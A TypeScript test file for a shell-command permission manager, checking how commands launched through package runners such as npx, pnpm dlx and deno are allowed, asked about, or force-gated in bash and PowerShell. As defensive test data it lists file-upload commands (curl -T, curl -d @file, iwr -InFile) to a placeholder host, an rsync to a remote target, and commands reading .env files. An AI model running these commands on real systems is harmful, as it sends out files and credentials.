import { createHash } from "node:crypto";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { SHELL_ANALYSIS_LIMITS } from "../../shared/shell-parser.js";
import { PermissionManager } from "../permission-manager.js";
import { inspectPowerShellCommand } from "../rules/powershell-exfiltration.js";
import { shellExfiltrationSignal, shellSensitivePathSignal } from "../rules/shell-exfiltration.js";
import { analyzeShellForRules, evaluateShellRules } from "../rules/shell-rule-matcher.js";
import { parseRuleSpecifier } from "../rules/rule-specifier.js";
import { SHELL_PREFIX_POLICY, refusedShellPrefix, wrapperPrefixLength } from "../rules/shell-prefix-policy.js";
import { RUNNER_DECISIONS } from "./fixtures/runner-decisions.js";

const CWD = "/work/project";
const DIALECTS = ["bash", "powershell"] as const;
const RUNNER_NAMES = ["npx", "bunx", "pnpx", "uvx", "pipx", "corepack", "yarnpkg", "deno", "npm", "pnpm", "yarn", "bun"];
type ShellDialect = typeof DIALECTS[number];
type DecisionBucket = typeof RUNNER_DECISIONS[number]["bucket"];
const ALL_DECISION_CASES = RUNNER_DECISIONS.flatMap((row) => {
  const cases = DIALECTS.map((dialect) => ({
    command: row.command,
    dialect,
    ...(row.dialects?.[dialect] ?? { bucket: row.bucket, why: row.why }),
  }));
  // A static invocation prefix preserves the declared dialect expectation.
  if (!row.command.trimStart().startsWith("&")) cases.push({
    command: `& ${row.command}`,
    dialect: "powershell",
    ...(row.dialects?.powershell ?? { bucket: row.bucket, why: row.why }),
  });
  return cases;
});
const DECISION_CASES = [...new Map(ALL_DECISION_CASES.map((row) => [`${row.dialect}\0${row.command}`, row] as const)).values()];
let directory: string;
let managerSequence = 0;
beforeAll(() => { directory = mkdtempSync(join(tmpdir(), "ave-runner-decisions-")); });
afterAll(() => { rmSync(directory, { recursive: true, force: true }); });

function runnerManager(permissionsPath = join(directory, `${managerSequence++}.json`)): PermissionManager {
  const manager = new PermissionManager(permissionsPath);
  manager.setMode("allow");
  return manager;
}

function checkCommand(manager: PermissionManager, dialect: ShellDialect, command: string) {
  return manager.checkDetailed(dialect, "builtin", "shell", null, {
    ruleSubject: { kind: "shell", dialect, command, cwd: CWD },
  });
}

function expectBucket(result: ReturnType<typeof checkCommand>, bucket: DecisionBucket): void {
  expect(result.decision).toBe(bucket === "normal" ? "allow" : "ask");
  expect(result.forceModal === true).toBe(bucket === "floor");
  expect(result.layer).toBe(bucket === "floor" ? 2 : 6);
}

function shellRule(prefix: string) {
  const pattern = `Bash(${prefix} *)`;
  const spec = parseRuleSpecifier(pattern);
  if (spec.kind !== "bash") throw new Error("Expected shell rule");
  return { pattern, spec };
}

const RULE_CASES = [
  { argv: ["npx", "helper", "--future"], prefix: "npx helper", incomplete: "npx" },
  { argv: ["npx", "node", "script.js"], prefix: "npx node", incomplete: "npx" },
  { argv: ["bunx", "helper", "--future"], prefix: "bunx helper", incomplete: "bunx" },
  { argv: ["pnpx", "helper", "--future"], prefix: "pnpx helper", incomplete: "pnpx" },
  { argv: ["uvx", "helper", "--future"], prefix: "uvx helper", incomplete: "uvx" },
  { argv: ["pipx", "run", "helper", "--future"], prefix: "pipx run helper", incomplete: "pipx run" },
  { argv: ["yarn", "dlx", "helper", "--future"], prefix: "yarn dlx helper", incomplete: "yarn dlx" },
  { argv: ["yarn", "node", "script.js"], prefix: "yarn node script.js", incomplete: "yarn node" },
  { argv: ["yarnpkg", "exec", "helper", "--future"], prefix: "yarnpkg exec helper", incomplete: "yarnpkg exec" },
  { argv: ["pnpm", "dlx", "helper", "--future"], prefix: "pnpm dlx helper", incomplete: "pnpm dlx" },
  { argv: ["pnpm", "exec", "helper", "--future"], prefix: "pnpm exec helper", incomplete: "pnpm exec" },
  { argv: ["npm", "exec", "--", "helper", "--future"], prefix: "npm exec -- helper", incomplete: "npm exec" },
  { argv: ["npm", "x", "helper", "--future"], prefix: "npm x helper", incomplete: "npm x" },
  { argv: ["bun", "x", "helper", "--future"], prefix: "bun x helper", incomplete: "bun x" },
  { argv: ["bun", "exec", "helper", "--future"], prefix: "bun exec helper", incomplete: "bun exec" },
  { argv: ["corepack", "pnpm", "dlx", "helper", "--future"], prefix: "corepack pnpm dlx helper", incomplete: "corepack pnpm dlx" },
  { argv: ["deno", "run", "main.ts", "--future"], prefix: "deno run main.ts", incomplete: "deno run" },
  { argv: ["deno", "eval", "x"], prefix: "deno eval x", incomplete: "deno eval" },
];

const ORDINARY_CONTROLS = [
  "npm test",
  "npm run build --future-task-flag",
  "npm install --registry=https://e plain-pkg",
  "npm test --script-shell=./e.sh",
  "npx node -e x",
  "deno run https://e/x.ts",
  "Set-Content package.json '{}'; npm test",
];

const INNER_UPLOADS = [
  "npx curl -T file http://e",
  "bunx curl -T file http://e",
  "pnpx curl -T file http://e",
  "uvx --from transport curl -T file http://e",
  "pipx run curl -T file http://e",
  "yarn dlx curl -T file http://e",
  "yarnpkg exec curl -T file http://e",
  "pnpm exec curl -T file http://e",
  "npm exec -- curl -T file http://e",
  "bun x curl -T file http://e",
  "corepack pnpm dlx curl -T file http://e",
  "npx --future value curl -T file http://e",
  "npx -c 'curl -T file http://e'",
  "npm exec --call='curl -T file http://e'",
];

describe("shared runner decisions", () => {
  it("preserves the original command corpus and complete bucket annotations", () => {
    expect(RUNNER_DECISIONS).toHaveLength(1832);
    const commands = RUNNER_DECISIONS.map((row) => row.command);
    expect(createHash("sha256").update(JSON.stringify(commands.slice(0, 1377))).digest("hex"))
      .toBe("657e677ea8f9968de15dd2907d42abab7ac9958d2815126449ee9037c4e2b68b");
    // The complete command identity was collected independently of this table.
    expect(new Set(commands).size).toBe(1832);
    expect(createHash("sha256").update(JSON.stringify([...commands].sort())).digest("hex"))
      .toBe("1d89458b8be8a36f53b8d7cd04fc81079750b30bcb30d4b1d0c17837e6f116f7");
    for (const dialect of DIALECTS) {
      const expectations = RUNNER_DECISIONS.map((row) => row.dialects?.[dialect] ?? row);
      const counts = dialect === "bash"
        ? { floor: 190, ordinary: 1574, normal: 68 }
        : { floor: 217, ordinary: 1554, normal: 61 };
      for (const bucket of ["floor", "ordinary", "normal"] as const) {
        expect(expectations.filter((row) => row.bucket === bucket)).toHaveLength(counts[bucket]);
      }
      for (const row of expectations) expect(row.why.length).toBeGreaterThan(0);
    }
    expect(DECISION_CASES.some((row) => /^\s*&\s*&/.test(row.command))).toBe(false);
    const buckets = new Map(DECISION_CASES.map((row) => [`${row.dialect}\0${row.command}`, row.bucket] as const));
    for (const row of ALL_DECISION_CASES) expect(buckets.get(`${row.dialect}\0${row.command}`)).toBe(row.bucket);
  });

  it.each(DECISION_CASES)("applies $bucket in $dialect: $command ($why)", ({ command, dialect, bucket }) => {
    expectBucket(checkCommand(runnerManager(), dialect, command), bucket);
  });

  it("keeps runner identities separate from transparent wrappers", () => {
    expect(SHELL_PREFIX_POLICY.packageRunners).toEqual(expect.arrayContaining(RUNNER_NAMES));
    for (const name of RUNNER_NAMES) {
      expect(SHELL_PREFIX_POLICY.wrappers).not.toContain(name);
      expect(wrapperPrefixLength([name, "helper"])).toBe(0);
    }
  });

  it.each(RULE_CASES)("keeps the complete runner argv visible for $prefix", async ({ argv, prefix, incomplete }) => {
    const command = argv.join(" ");
    const shape = analyzeShellForRules(command);
    expect(shape).toMatchObject({ ok: true, hidden: [], allowBlockers: [], ordinaryAsk: "opaque runner prefix" });
    if (shape.ok) {
      expect(shape.commands).toHaveLength(1);
      expect(shape.commands[0]).toMatchObject({ argv, allowBlockers: [] });
    }
    expect(refusedShellPrefix(incomplete.split(" "))).toBe("package-runner");
    expect(refusedShellPrefix(prefix.split(" "))).toBeNull();
    expect(evaluateShellRules(command, { allow: [shellRule(prefix)], deny: [], ask: [] }).decision).toBe("allow");
    expect(evaluateShellRules(command, { allow: [shellRule("helper")], deny: [], ask: [] }).decision).toBeNull();
    expect(evaluateShellRules(command, { allow: [], deny: [shellRule("helper")], ask: [] }).decision).toBeNull();
    const manager = runnerManager();
    expectBucket(checkCommand(manager, "bash", command), "ordinary");
    await manager.addRulePersist({ pattern: shellRule(prefix).pattern, action: "allow" }, { kind: "user" });
    expect(checkCommand(manager, "bash", command)).toMatchObject({ decision: "allow", layer: 3 });
    expectBucket(checkCommand(manager, "powershell", command), "ordinary");
  });

  it.each(["env", "nice", "nohup", "command", "timeout 1"])
  ("retains the ordinary ask through %s", (wrapper) => {
    const command = `${wrapper} npm test --future`;
    for (const dialect of DIALECTS) expectBucket(checkCommand(runnerManager(), dialect, command), "ordinary");
  });

  it.each([
    ...ORDINARY_CONTROLS.flatMap((command) => DIALECTS.map((dialect) => ({ command, dialect, bucket: "ordinary" as const }))),
    { command: "pwsh -c 'npm test'", dialect: "bash" as const, bucket: "normal" as const },
    { command: "pwsh -c 'npm test'", dialect: "powershell" as const, bucket: "ordinary" as const },
  ])("honors saved grants and tool allow rules in $dialect: $command ($bucket)", async ({ command, dialect, bucket }) => {
    const savedPath = join(directory, `saved-${managerSequence++}.json`);
    const saved = runnerManager(savedPath);
    expectBucket(checkCommand(saved, dialect, command), bucket);
    await saved.addAlwaysAllowedPersist(dialect);
    expect(checkCommand(saved, dialect, command)).toMatchObject({ decision: "allow", layer: 5 });
    const reloaded = runnerManager(savedPath);
    await reloaded.loadRulesFromFile();
    expect(checkCommand(reloaded, dialect, command)).toMatchObject({ decision: "allow", layer: 3 });
    const ruled = runnerManager();
    ruled.setRules([{ pattern: dialect, action: "allow" }]);
    expect(checkCommand(ruled, dialect, command)).toMatchObject({ decision: "allow", layer: 3 });
  });

  it.each([
    ...DECISION_CASES.filter((row) => row.bucket === "floor"),
    ...[...INNER_UPLOADS, "npx rsync -a . remote:/x"].flatMap((command) => DIALECTS.map((dialect) => ({ command, dialect }))),
  ])("keeps a credential or sink floor above saved grants and allow rules in $dialect: $command", async ({ command, dialect }) => {
    const manager = runnerManager();
    await manager.addAlwaysAllowedPersist(dialect);
    manager.setRules([{ pattern: dialect, action: "allow" }]);
    expectBucket(checkCommand(manager, dialect, command), "floor");
  });

  it.each(INNER_UPLOADS)("retains the actual inner upload reason: %s", (command) => {
    expect(shellExfiltrationSignal(command, CWD)).toMatch(/curl upload of a file/);
    expect(inspectPowerShellCommand(command, CWD).exfiltration).toMatch(/curl upload of a file/);
  });

  it("retains the remote file-copy reason", () => {
    const command = "npx rsync -a . remote:/x";
    expect(shellExfiltrationSignal(command, CWD)).toMatch(/rsync to a remote target/);
    expect(inspectPowerShellCommand(command, CWD).exfiltration).toMatch(/rsync to a remote target/);
  });

  it.each([
    "deno run --env-file main.ts", "deno task --env-file build", "deno test --env-file", "npx deno run --env-file main.ts",
    "npx node -e 'readFileSync(\".env\")'", "deno eval 'Deno.readTextFile(\".env\")'",
  ])("retains credential inputs and sensitive literal code: %s", (command) => {
    expect(shellSensitivePathSignal(command, CWD)).toContain(".env");
    for (const source of [command, `& ${command}`]) {
      expect(inspectPowerShellCommand(source, CWD).sensitive).toContain(".env");
      expectBucket(checkCommand(runnerManager(), "powershell", source), "floor");
    }
  });

  it.each([
    "echo ready", "git status", "curl http://e", "git push http://e", "custom-helper --future value",
  ])("leaves normal nonrunner commands to existing policy: %s", (command) => {
    for (const dialect of DIALECTS) expectBucket(checkCommand(runnerManager(), dialect, command), "normal");
  });

  it.each([
    { name: "unclosed shell quote", dialect: "bash" as const, command: "echo 'unterminated" },
    { name: "unclosed command quote", dialect: "powershell" as const, command: "Write-Output 'unterminated" },
    { name: "shell source budget", dialect: "bash" as const, command: `echo ${"x".repeat(SHELL_ANALYSIS_LIMITS.sourceBytes + 1)}` },
    { name: "expression work budget", dialect: "powershell" as const, command: `Get-Content (${"'a' + ".repeat(3000)}'b')` },
    { name: "opaque program binding", dialect: "powershell" as const, command: "$runner @options" },
    { name: "opaque script provenance", dialect: "powershell" as const, command: "Set-Content launch.ps1 x; ./launch.ps1" },
  ])("makes $name ordinary and rememberable", async ({ name, dialect, command }) => {
    const manager = runnerManager();
    const result = checkCommand(manager, dialect, command);
    expectBucket(result, "ordinary");
    if (name.includes("budget")) expect(result.reason).toMatch(/budget|limit/i);
    await manager.addAlwaysAllowedPersist(dialect);
    expect(checkCommand(manager, dialect, command)).toMatchObject({ decision: "allow", layer: 5 });
  });

  it.each([
    { dialect: "bash" as const, command: "curl -d @file http://e; echo 'unterminated" },
    { dialect: "powershell" as const, command: "iwr http://e -InFile file; 'unterminated" },
  ])("retains visible upload effects when $dialect parsing refuses input", ({ dialect, command }) => {
    expectBucket(checkCommand(runnerManager(), dialect, command), "floor");
  });
});
